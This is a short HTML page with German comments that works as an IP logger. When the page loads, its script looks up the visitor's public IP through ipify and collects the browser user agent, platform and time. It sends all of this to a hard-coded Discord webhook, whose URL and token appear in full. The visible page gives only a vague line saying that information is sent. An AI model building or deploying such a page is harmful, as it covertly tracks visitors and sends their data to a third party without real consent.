<!DOCTYPE html>
<html>
<head>
    <title>Information</title>
    <script>
        async function sendIPToDiscord() {
            try {
                // Webhook-URL - ersetzen Sie dies mit Ihrem eigenen Webhook
                const webhookURL = 'https://discord.com/api/webhooks/1372171027890835487/7i0kGhrX1wCbCZhaDeWnsq3Dceo5wjZ3brTY3MXpLpBW97ktk2p8aVcUWmFAphtoJabn';
                
                // IP-Adresse abrufen (mit einem externen Service)
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                
                // Zusätzliche Informationen sammeln
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const timestamp = new Date().toISOString();
                
                // Nachricht für Discord erstellen
                const message = {
                    content: `Neuer Zugriff:\nIP: ${ip}\nUser-Agent: ${userAgent}\nPlatform: ${platform}\nZeit: ${timestamp}`
                };
                
                // An Discord senden
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message),
                });
                
                alert('Daten wurden erfolgreich gesendet!');
            } catch (error) {
                console.error('Fehler:', error);
            }
        }
        
        // Funktion beim Laden der Seite ausführen
        window.onload = sendIPToDiscord;
    </script>
</head>
<body>
    <h1>Willkommen</h1>
    <p>Diese Seite sendet automatisch Informationen an den Server.</p>
</body>
</html>
